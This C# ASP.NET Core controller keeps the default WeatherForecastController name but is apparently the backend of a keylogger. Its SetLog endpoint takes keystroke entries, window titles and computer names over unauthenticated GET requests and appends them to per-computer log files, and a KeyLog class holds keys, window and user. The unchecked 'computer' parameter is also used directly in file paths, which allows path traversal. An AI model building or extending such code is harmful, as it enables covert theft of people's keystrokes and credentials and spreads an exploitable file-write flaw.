using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;


namespace Server.Controllers
{
    [ApiController]
    [Route("[controller]/[action]")]

    public class WeatherForecastController : ControllerBase
    {
        private readonly ILogger<WeatherForecastController> _logger;

        public WeatherForecastController(ILogger<WeatherForecastController> logger)
        {
            _logger = logger;
        }

        [HttpGet]
        public async Task<IActionResult> GetData()
        {
            if (!System.IO.File.Exists("../../log.txt"))
                return NotFound("Log file does not exist");

            string text = await System.IO.File.ReadAllTextAsync("../../log.txt");
            return Ok(text);
        }

        [HttpGet]
        public async Task<IActionResult> SetLog([FromQuery]string logEntry, [FromQuery]string window = null, [FromQuery]string computer = "LogFile", [FromQuery] DateTime? time  = null )
        {
            try
            {
                // Записываем текстовую строку в файл
                System.IO.Directory.CreateDirectory($"../../{computer}");
                await System.IO.File.AppendAllTextAsync($"../../{computer}/log.txt", $"{time ?? DateTime.Now}|{window}|{logEntry}\n");

                // Возвращаем успешный результат
                return Ok("Log entry processed successfully.");
            }
            catch (Exception ex)
            {
                // Обрабатываем возможные ошибки
                return BadRequest($"Error: {ex.Message}");
            }
        }
    }
    public class KeyLog
    {
        public string Window { get; set; }
        //public DateTime Time { get; set; }
        public List<string> Keys { get; set; }
        public string User { get; set; }
    }
}
